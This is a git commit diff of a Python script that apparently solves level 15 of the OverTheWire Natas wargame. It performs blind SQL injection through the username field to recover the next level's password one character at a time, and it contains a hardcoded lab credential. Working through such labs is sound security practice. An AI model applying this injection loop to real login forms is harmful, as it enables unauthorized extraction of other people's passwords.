766e181a497a41a9367e665b4d98f87ae695039e
Muhammadreza Haghiri <haghiri75@gmail.com>
2020-12-06 15:30:15 +0330

    The perfect brute force attack

--- natas15/hack.py
+++ natas15/hack.py
@@ -1,4 +1,6 @@
 import requests
+ 
+characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 username = "natas15"
 password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
@@ -6,6 +8,15 @@ password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
 url = "http://natas15.natas.labs.overthewire.org/"
 
 session = requests.Session()
-response = session.post(url, data = {"username": 'natas16" AND password LIKE "%" #' }, auth=(username, password))
 
-print(response.text)
+seen_password = list() 
+
+while True:
+    for c in characters:
+        print("Tryig with the password: " + "".join(seen_password) + c)
+        response = session.post(url, data = {"username": 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + c + "%" + '" #' }, auth=(username, password))
+        content = response.text 
+
+        if('user exists' in content):
+            seen_password.append(c)
+            break 
